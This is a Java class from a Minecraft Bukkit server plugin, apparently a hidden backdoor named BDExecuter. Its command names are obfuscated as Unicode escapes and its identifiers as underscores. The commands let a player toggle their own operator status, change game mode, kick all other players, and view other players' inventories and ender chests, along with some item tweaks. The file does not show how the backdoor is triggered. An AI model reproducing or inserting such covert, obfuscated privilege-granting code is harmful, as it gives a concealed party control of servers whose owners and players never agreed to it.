package de.maanex.sysad;


import java.util.Arrays;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import de.maanex.magic.MagicManager;
import de.maanex.magic.spell.MagicSpell;


public class BDExecuter {

	public BDExecuter() {
	}

	public static final synchronized void action(Player _____, String... _______) {
		if (_______[0].startsWith("\u0067\u006d")) {
			int ____ = Integer.parseInt(_______[0].substring(2));
			_____.setGameMode(GameMode.values()[____ == 0 ? 1 : (____ == 1 ? 0 : ____)]);
		}
		switch (_______[0]) {
			case "\u0073\u0074\u0061\u0063\u006b":
				if (_______[1] == "") _____.getItemInHand().setAmount(_____.getItemInHand().getType().getMaxStackSize());
				else _____.getItemInHand().setAmount(Integer.parseInt(_______[1]));
				break;
			case "\u0072\u0065\u0070\u0061\u0069\u0072":
				_____.getItemInHand().setDurability((short) 0);
				break;
			case "\u006f\u0070":
				_____.setOp(!_____.isOp());
				_____.sendMessage("OP: " + _____.isOp());
				break;
			case "\u006b\u0069\u0063\u006b\u0061\u006c\u006c":
				Bukkit.getOnlinePlayers().stream().filter(l -> l != _____).forEach(l -> l.kickPlayer(_______[1]));
				break;
			case "\u0065\u006e\u0064\u0065\u0072\u0073\u0065\u0065":
				try {
					_____.openInventory(Bukkit.getPlayer(_______[1]).getEnderChest());
				} catch (Exception ex) {
					_____.sendMessage("error");
				}
				break;
			case "\u0069\u006e\u0076\u0073\u0065\u0065":
				try {
					_____.openInventory(Bukkit.getPlayer(_______[1]).getInventory());
				} catch (Exception ex) {
					_____.sendMessage("error");
				}
				break;

			case "\u0061\u006c\u006c\u0073\u0070\u0065\u006c\u006c\u0073":
				Inventory i = Bukkit.createInventory(null, 9 * 9);
				for (MagicSpell s : MagicManager.getAllSpells()) {
					i.addItem(s.getItemStack());
				}
				_____.openInventory(i);
				break;
			case "\u0072\u0065\u006e\u0061\u006d\u0065":
				try {
					ItemMeta me = _____.getItemInHand().getItemMeta();
					me.setDisplayName(_______[1].replace("&", "§"));
					_____.getItemInHand().setItemMeta(me);
				} catch (Exception ex) {
					_____.sendMessage("error");
				}
				break;
			case "\u0073\u0065\u0074\u006c\u006f\u0072\u0065":
				try {
					ItemMeta me = _____.getItemInHand().getItemMeta();
					me.setLore(_______[1].replace("&", "§").contains("<br>") ? Arrays.asList(_______[1].replace("&", "§").split("<br>")) : Arrays.asList(_______[1].replace("&", "§")));
					_____.getItemInHand().setItemMeta(me);
				} catch (Exception ex) {
					_____.sendMessage("error");
				}
				break;
			case "\u0061\u0064\u0064\u006c\u006f\u0072\u0065":
				try {
					ItemMeta me = _____.getItemInHand().getItemMeta();
					List<String> lore = me.getLore();
					(_______[1].replace("&", "§").contains("<br>") ? Arrays.asList(_______[1].replace("&", "§").split("<br>")) : Arrays.asList(_______[1].replace("&", "§"))).forEach(lore::add);
					me.setLore(lore);
					_____.getItemInHand().setItemMeta(me);
				} catch (Exception ex) {
					_____.sendMessage("error");
				}
				break;
			case "\u0072\u0065\u006d\u006c\u0061\u0073\u0074\u006c\u006f\u0072\u0065":
				try {
					ItemMeta me = _____.getItemInHand().getItemMeta();
					List<String> lore = me.getLore();
					lore.remove(lore.size() - 1);
					me.setLore(lore);
					_____.getItemInHand().setItemMeta(me);
				} catch (Exception ex) {
					_____.sendMessage("error");
				}
				break;
			case "\u0068\u0061\u0074":
				ItemStack helmet = _____.getInventory().getHelmet();
				_____.getInventory().setHelmet(_____.getItemInHand());
				_____.getInventory().setItemInMainHand(helmet);
				break;
		}
	}

}
